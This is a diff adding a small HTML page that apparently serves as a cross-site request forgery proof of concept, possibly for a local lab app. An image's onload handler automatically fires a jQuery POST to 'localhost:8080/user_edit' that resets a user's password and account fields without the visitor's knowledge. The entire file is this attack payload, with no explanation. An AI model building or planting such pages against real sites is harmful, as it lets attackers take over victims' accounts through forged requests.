@@ -1,0 +1,19 @@
+<html>
+<head>
+
+<script>
+
+function my_script() {
+	$.post( "localhost:8080/user_edit", { name: "user", password: "test", password2: "test",  email: "user@web.de", newUser: "false", vip: "false" } );
+}
+
+</script>
+
+</head>
+
+<body>
+
+<img src="/static/images/opossum.jpg" onload="my_script()"/>
+
+</body>
+</html>
